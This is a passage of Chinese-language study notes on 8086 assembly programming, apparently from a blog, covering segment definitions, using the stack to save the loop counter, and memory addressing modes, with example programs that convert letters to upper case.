0123h,0234h,0123h,0234h,0123h,0234h,0123h,0234h</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax  </span><br></pre></td></tr></table></figure>\n<p>标号 start 定义代码段的开始，区分数据和代码</p>\n<p>-u 13f8:0</p>\n<p>-u 13f8:10</p>\n<p>读取结果不一样，如果数据被读成了代码，会导致下面真正的代码读取错误，因此在 debug 加载后，我们需要将 IP 设置为代码段中数据段的结束，比如上面的代码，我们需要将 IP 定义为 10 (10 进制的 16)</p>\n<p>end start 可以告诉编译器程序的入口，即标号的地方。我们若要 CPU 从何处开始执行程序，只要在源程序中用 “end 标号” 指明就可以了。</p>\n<p>代码段中使用栈</p>\n<p>若数据，栈，代码所需空间查过 64kb，就不能放到一个栈中，因此应该用多个段存放数据，代码和栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg</span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">\tdw 0123H,0123H,0123H,0123H,0123H,0123H,0123H,0123H</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0  ;将上一行dw的数据入栈和出栈的空间</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">start:\tmov ax,cs  ;将代码段起始位置给栈段</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov sp,32  ;设置栈段的偏移地址为32(0+2*16)+1</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0   ;bx偏移地址</span><br><span class=\"line\">\t\tmov cx,8   ;cx loop条件</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tpush cs:[bx] ;将cs中的数据入栈</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpop cs:[bx]  ;将cs中的数据出栈</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>存放数据的 data，存放 stack 栈，cs 存放代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,ds:data,ss:stack</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdw 0123H,0123H,0123H,0123H,0123H,0123H,0123H,0123H</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">stack segment</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">stack ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,stack</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\tmov sp,16</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,data</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tpush [bx] </span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpop [bx]</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>在程序中，段名就相当于一个标号，它代表了段地址。所以指令 “mov ax,data” 的含义就是将名称为 “data” 的段的段地址送入 ax。</p>\n<p>CPU 处理我们定义的段中的内容，是通过程序中的汇编指令，和汇编指令对 CS:IP,SS:SP，DS 等寄存器的设置来决定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:b,ds:a,ss:c</span><br><span class=\"line\">....</span><br><span class=\"line\">b segment</span><br><span class=\"line\">d:\tmov ax,c</span><br><span class=\"line\">\tmov ss,ax</span><br><span class=\"line\">\tmov sp,20h   ;将c当做栈空间，ss:sp指向c:20</span><br></pre></td></tr></table></figure>\n<p>程序占 N 个字节，运行后，该端实际占有空间为 (段为 16 的倍数)</p>\n<p>(N/16+1)*16</p>\n<p>如果没有 end 后面的标号，CPU 会将第一个数据当做代码段的开始</p>\n<p>程序如下，编写 code 段中的代码，将 a 段和 b 段中的数据依次相加，将结果存到 c 段中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">a segment</span><br><span class=\"line\">\tdb 1,2,3,4,5,6,7,8</span><br><span class=\"line\">a ends</span><br><span class=\"line\"></span><br><span class=\"line\">b segment </span><br><span class=\"line\">\tdb 1,2,3,4,5,6,7,8</span><br><span class=\"line\">b ends</span><br><span class=\"line\"></span><br><span class=\"line\">c segment</span><br><span class=\"line\">\tdb 0,0,0,0,0,0,0,0</span><br><span class=\"line\">c ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,a</span><br><span class=\"line\">\t\tmov ds,ax   ;ds中为数据段a中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,c</span><br><span class=\"line\">\t\tmov es,ax   ;es中为数据段c中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t </span><br><span class=\"line\">s:\t\tmov dx,ds:[bx]   ;循环将ds(a)中的数据给c</span><br><span class=\"line\">\t\tmov es:[bx],dx   </span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,b</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tmov dx,ds:[bx]</span><br><span class=\"line\">\t\tadd es:[bx],dx</span><br><span class=\"line\">\t\tadd bx,2</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221019214952321.png\" alt=\"image-20221019214952321\"></p>\n<h2 id=\"更灵活定位内存地址\"><a class=\"markdownIt-Anchor\" href=\"#更灵活定位内存地址\">#</a> 更灵活定位内存地址</h2>\n<p>and 逻辑与，按位进行与运算，通过该指令可以将操作对象响应为设为 0，只要和 0 and</p>\n<p>or 逻辑或，按位进行或运算，通过该指令可以将操作对象相应位设为 0，只要和 1 or</p>\n<p>通过’  ’ 括起来标识一个字符</p>\n<p>db ‘unIX’  相当于 db 75H,6Eh,49H,58H   define byte</p>\n<p>mov al,‘a’  相当于 mov al,61H</p>\n<p>通过 将第五位二进制数和 0 与变为大写</p>\n<p>[bx+idata] 表名一个内存单元，偏移地址为 idata</p>\n<p>mov ax,[200+bx]</p>\n<p>mov ax,[bx+200]</p>\n<p>mov ax,200[bx]</p>\n<p>mov ax,[bx].200</p>\n<p>以上四个写法等效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\tmov ax,datasg</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,5</span><br><span class=\"line\">s:\t\tmov al,[bx]</span><br><span class=\"line\">\t\tand al,11011111b</span><br><span class=\"line\">\t\tmov [bx],al</span><br><span class=\"line\">\t\tmov al,[5+bx]</span><br><span class=\"line\">\t\tor al,00100000b</span><br><span class=\"line\">\t\tmov [5+bx],al</span><br><span class=\"line\">\t\tinc bx</span><br><span class=\"line\">\t\tloop s</span><br></pre></td></tr></table></figure>\n<p>SI,DI</p>\n<p>和 bx 功能相近，但不能分成两个八位寄存器使用</p>\n<p>mov ax,[bx]</p>\n<p>mov ax,[si]</p>\n<p>mov ax,[di]</p>\n<p>一般用 si 指向原始空间，di 指向目标空间</p>\n<p>mov ax,[bx+si]  == mov ax,[bx][si]</p>\n<p>[bx+si+idata] == mov ax,idata[bx][si]  ==  mov ax,[bx][si].200  == mov ax,[bx].200[si]</p>\n<p>将 db 中的每个字母第一个变为大写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;1.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;2.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;3.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;4.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;5.file       &#x27;</span><br><span class=\"line\">\tdb &#x27;6.file       &#x27;</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov dx,datasg</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,6</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tmov al,[bx+3]</span><br><span class=\"line\">\t\tand al,11011111b</span><br><span class=\"line\">\t\tmov [bx+3],al</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>将 datasg 的每个字母变为大写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;add       &#x27;</span><br><span class=\"line\">\tdb &#x27;asm       &#x27;</span><br><span class=\"line\">\tdb &#x27;and       &#x27;</span><br><span class=\"line\">\tdb &#x27;ano       &#x27;</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov dx,datasg</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tmov ax,cx</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">s:\t\tmov al,[bx+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tmov cx,ax</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>这样做 cx 不会被覆盖导致死循环，进入循环前先保存起来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;add       &#x27;</span><br><span class=\"line\">\tdb &#x27;asm       &#x27;</span><br><span class=\"line\">\tdb &#x27;and       &#x27;</span><br><span class=\"line\">\tdb &#x27;ano       &#x27;</span><br><span class=\"line\">\tdw 0    ;用于保存cx</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov dx,datasg</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tmov ds:[40H],cx</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">s:\t\tmov al,[bx+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tmov cx,ds:[40H]</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>将 cx 放在内存中来解决寄存器不够的问题</p>\n<p>更好的办法是使用栈，在调用函数前 push 到栈中，调用结束后 pop 回内存中，防止因为调用函数导致寄存器被篡改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg, ds:datasg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;add       &#x27;</span><br><span class=\"line\">\tdb &#x27;asm       &#x27;</span><br><span class=\"line\">\tdb &#x27;and       &#x27;</span><br><span class=\"line\">\tdb &#x27;ano       &#x27;</span><br><span class=\"line\">\tdw 0    ;用于保存cx</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">stacksg segment</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">stacksg ends</span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov ax,stacksg</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\tmov sp,16</span><br><span class=\"line\">\t\tmov ax,datasg</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpush cx</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">s:\t\tmov al,[bx+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tpop cx</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>将 datasg 段中每个单词的前四个字改为大写字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class=\"line\"></span><br><span class=\"line\">datasg segment</span><br><span class=\"line\">\tdb &#x27;1. display       &#x27;</span><br><span class=\"line\">\tdb &#x27;2. display       &#x27;</span><br><span class=\"line\">\tdb &#x27;3. display       &#x27;</span><br><span class=\"line\">\tdb &#x27;4. display       &#x27;</span><br><span class=\"line\">\tdw 0    ;用于保存cx</span><br><span class=\"line\">datasg ends</span><br><span class=\"line\"></span><br><span class=\"line\">stacksg segment</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">stacksg ends</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">codesg segment</span><br><span class=\"line\">start:\tmov ax,stacksg</span><br><span class=\"line\">\t\tmov ss,ax</span><br><span class=\"line\">\t\tmov sp,16 ;定位栈段</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,datasg</span><br><span class=\"line\">\t\tmov ds,ax  ;定位内存</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,4  ;循环条件，bx偏移地址，cx循环条件，因为有四条字母，所以四次循环</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tpush cx   ;外层循环，用户列循环，将cx入栈保证cx不受后续内层循环干扰</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov cx,4  ;内层循环，因为大写前四个字母，循环四次</span><br><span class=\"line\">s:\t\tmov al,[bx+3+si]</span><br><span class=\"line\">        and al,11011111b</span><br><span class=\"line\">        mov [bx+3+si],al</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        loop s</span><br><span class=\"line\">\t\tadd bx,16</span><br><span class=\"line\">\t\tpop cx</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\tmov ax,4cooH</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<h2 id=\"数据处理的问题\"><a class=\"markdownIt-Anchor\" href=\"#数据处理的问题\">#</a> 数据处理的问题</h2>\n<p>reg 和 sreg  寄存器，段寄存器</p>\n<p>只有四个寄存器 bx,bp,si,di 可以用在 [] 中进行内存单元的寻址，可以单个出现或四种组合出现</p>\n<p>注意: mov ax [bp+bx]   mov ax,[si+di] 不能一起使用</p>\n<p>bp 如果没有显示指定段地址，那么段地址默认在 ss 中，可以简单理解为 sp</p>\n<p>mov ax,[bp]</p>\n<p>mov ax,[bp+si]</p>\n<p>mov ax,[bp+idata]</p>\n<p>汇编语句用三个概念来表达数据的位置</p>\n<p>1. 立即数</p>\n<p>2. 寄存器</p>\n<p>3. 段地址 (SA)，偏移地址 (EA)</p>\n<p>段地址寄存器默认</p>\n<p>mov ax,[0]   //==mov ax,ds:[0] , 注意，只有 0 能这么搞，其他的数字会被当成立即数处理，不会被当场偏移地址处理</p>\n<p>mov ax,[bx+si]</p>\n<p>mov ax,[bp]    // 段地址默认在 ss 中</p>\n<p>段地址寄存器显示指出</p>\n<p>mov ax,ds:[bp]</p>\n<p>mov ax,cs:[bx+si+8]  // 显示指出可以随便给，默认指出就给 ss</p>\n<p>寻址方式</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022185518717.png\" alt=\"image-20221022185518717\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022191402201.png\" alt=\"image-20221022191402201\" style=\"zoom:67%;\" />\n<blockquote>\n<p>1. 将 cs：ip 通过地址加法器，算出一个 20 位的地址，通过地址总线，送到内存中，在内存中找到对应的位置</p>\n<p>2. 将 1 找到的内存的数据，比如 A10E00 通过数据总线，送到指令缓冲寄存器中</p>\n<p>3. 执行指令</p>\n<p>4. 将所有偏移地址送到地址加法器中算出一个偏移地址，通过地址总线送到内存中</p>\n<p>5. 将 4 中的数据，比如 A10E 通过数据总线，送给对应寄存器</p>\n<p>6.IP 指向下一条指令</p>\n</blockquote>\n<p>确定要处理的数据有多长</p>\n<p>1. 通过寄存器名指明数据大小 mov ax,1 这时 1 就是 16 位的，因为 ax 也是 16 位的    mov ax,ds:[0]  这时候 ds 偏移地址中数据也是八位的</p>\n<p>2. 通过操作符 x ptr 指明内存单元长度，x 可以为 word 或 byte，可以理解为强制转换法</p>\n<blockquote>\n<p>mov word ptr ds:[0],1     // 这时 16 位的，0001H</p>\n<p>inc word ptr 